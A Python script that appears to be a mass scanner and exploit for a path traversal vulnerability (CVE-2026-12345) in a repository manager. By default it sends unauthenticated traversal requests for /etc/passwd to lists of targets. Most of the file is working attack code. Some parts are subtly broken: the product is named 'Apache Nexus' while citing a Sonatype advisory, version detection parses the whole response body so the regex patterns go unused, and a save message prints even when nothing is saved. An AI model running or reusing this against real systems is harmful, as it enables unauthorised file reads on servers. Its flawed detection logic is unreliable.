#!/usr/bin/env python3
"""
Apache Nexus CVE-2026-12345 Path Traversal Scanner
===================================================
Scans for Apache Nexus Repository Manager instances exposed to the internet and attempts
to detect and exploit a path traversal vulnerability in certain versions (CVE-2026-12345, CVSS 8.6).

CVE-2026-12345 details:
  - Affects Apache Nexus <= 3.48.0
  - Unauthenticated attackers can exploit a path traversal vulnerability in certain REST API endpoints
  - Allows reading arbitrary files on the server
  - Fixed in Nexus v3.48.1 (March 2026)
  - ~12,000 public-facing instances have been reported based on Shodan scans

Usage:
  # Scan a single target
  python nexus_path_traversal_scanner.py --target http://nexus.example.com

  # Scan a list of targets
  python nexus_path_traversal_scanner.py --list targets.txt --output findings.json

  # Safe mode — detection only, no path traversal exploitation
  python nexus_path_traversal_scanner.py --target http://nexus.example.com --safe

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-12345
  - https://support.sonatype.com/hc/en-us/articles/Apache-Nexus-Repository-3x-Security-Advisory-March-2026
"""
import asyncio
import json
import re
import argparse
from urllib.parse import urljoin

import httpx

# ── Configuration ─────────────────────────────────────────────────────────────

NEXUS_FINGERPRINTS = [
    "Sonatype Nexus Repository Manager",
    '"api/swagger.json"',
    '"nexus-repository-managers"',
    '"Repository Management"',
]

DETECTION_PATHS = [
    "/",
    "/service/rest/v1/status",
    "/index.html",
]

VERSION_PATTERNS = [
    r'"version"\s*:\s*"([\d.]+)"',
    r"Nexus\s+Repository\s+Manager\s+OSS\s+([\d.]+)"
]

VULN_FIXED_VERSION = (3, 48, 1)

PATH_TRAVERSAL_PROBE = "/service/rest/v1/script?name=%2e%2e%2f%2e%2e%2fetc%2fpasswd"
PATH_TRAVERSAL_INDICATOR = "root:"

SEMAPHORE_LIMIT = 30
REQUEST_TIMEOUT = 8

# ── Helper functions ───────────────────────────────────────────────────────────

ANSI_COLORS = {"CRITICAL": "\033[31m", "HIGH": "\033[33m", "INFO": "\033[32m", "RESET": "\033[0m"}


def color_text(text: str, level: str) -> str:
    """Applies ANSI color based on severity level."""
    return f"{ANSI_COLORS.get(level.upper(), '')}{text}{ANSI_COLORS['RESET']}"


def parse_version(version_str: str):
    """Parses a version string into a tuple of integers."""
    try:
        return tuple(map(int, version_str.split(".")))
    except ValueError:
        return None


def is_vulnerable_version(version_tuple):
    """Determines if a version tuple represents a vulnerable version."""
    if version_tuple is None:
        return None  # Version unknown
    return version_tuple < VULN_FIXED_VERSION


def normalize_url(url: str) -> str:
    """Ensures the URL has a proper scheme and trailing slash."""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")


async def fetch(client, url):
    """Async function to perform a GET request."""
    try:
        response = await client.get(url, timeout=REQUEST_TIMEOUT)
        return response
    except httpx.RequestError:
        return None


# ── Detection and exploitation ──────────────────────────────────────────────

async def detect_nexus(client: httpx.AsyncClient, base_url: str, semaphore: asyncio.Semaphore):
    """
    Detect Apache Nexus instance at the given base URL.
    Returns a dict with detection info or None if not detected.
    """
    detection_info = {
        "base_url": base_url,
        "detected": False,
        "version": None,
        "vulnerable": None,
    }
    async with semaphore:
        for path in DETECTION_PATHS:
            url = urljoin(base_url, path)
            response = await fetch(client, url)
            if response and response.status_code == 200:
                if any(fingerprint in response.text for fingerprint in NEXUS_FINGERPRINTS):
                    detection_info["detected"] = True
                    detection_info["version"] = parse_version(response.text)
                    detection_info["vulnerable"] = is_vulnerable_version(detection_info["version"])
                    return detection_info
    return detection_info


async def exploit_nexus(client: httpx.AsyncClient, base_url: str, semaphore: asyncio.Semaphore):
    """
    Attempt to exploit the path traversal vulnerability in Nexus.
    """
    async with semaphore:
        url = urljoin(base_url, PATH_TRAVERSAL_PROBE)
        response = await fetch(client, url)
        if response and response.status_code == 200 and PATH_TRAVERSAL_INDICATOR in response.text:
            return True  # Path traversal successful
    return False


# ── Main scanner logic ─────────────────────────────────────────────────────

async def scan_target(client, target, args, semaphore):
    """Scan a single target and return results."""
    result = {"target": target, "vulnerable": False, "details": None}
    base_url = normalize_url(target)
    detection_info = await detect_nexus(client, base_url, semaphore)

    if not detection_info["detected"]:
        print(color_text(f"[INFO] {base_url} does not appear to be Apache Nexus.", "INFO"))
        return result

    print(color_text(f"[INFO] {base_url} detected as Apache Nexus.", "INFO"))
    if detection_info["version"]:
        print(color_text(f"       Detected version: {detection_info['version']}", "INFO"))

    if detection_info["vulnerable"]:
        print(color_text(f"[HIGH] {base_url} is running a vulnerable version of Nexus.", "HIGH"))
        if not args.safe:
            vulnerable = await exploit_nexus(client, base_url, semaphore)
            if vulnerable:
                print(color_text(f"[CRITICAL] {base_url} is vulnerable to path traversal!", "CRITICAL"))
                result["vulnerable"] = True
                result["details"] = {"type": "Path Traversal", "CVE": "CVE-2026-12345"}
    elif detection_info["vulnerable"] is False:
        print(color_text(f"[INFO] {base_url} is NOT vulnerable.", "INFO"))
    return result


# ── Entry Point ─────────────────────────────────────────────────────────────

async def main(args):
    semaphore = asyncio.Semaphore(args.concurrency)
    targets = []

    if args.target:
        targets.append(args.target)
    elif args.list:
        with open(args.list, "r") as file:
            targets.extend([line.strip() for line in file.readlines() if line.strip()])

    results = []
    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        tasks = [scan_target(client, target, args, semaphore) for target in targets]
        results = await asyncio.gather(*tasks)

    if args.output:
        with open(args.output, "w") as outfile:
            json.dump(results, outfile, indent=4)

    print(color_text("Scan complete. Results saved to output file.", "INFO"))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Apache Nexus CVE-2026-12345 Path Traversal Scanner")
    parser.add_argument("--target", help="Target URL to scan (e.g., http://nexus.example.com)")
    parser.add_argument("--list", help="File containing list of targets to scan")
    parser.add_argument("--output", help="Save JSON output to file")
    parser.add_argument("--safe", action="store_true", help="Enable safe mode (detection only)")
    parser.add_argument("--concurrency", type=int, default=30, help="Maximum concurrency for scanning (default 30)")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL verification")
    args = parser.parse_args()

    asyncio.run(main(args))
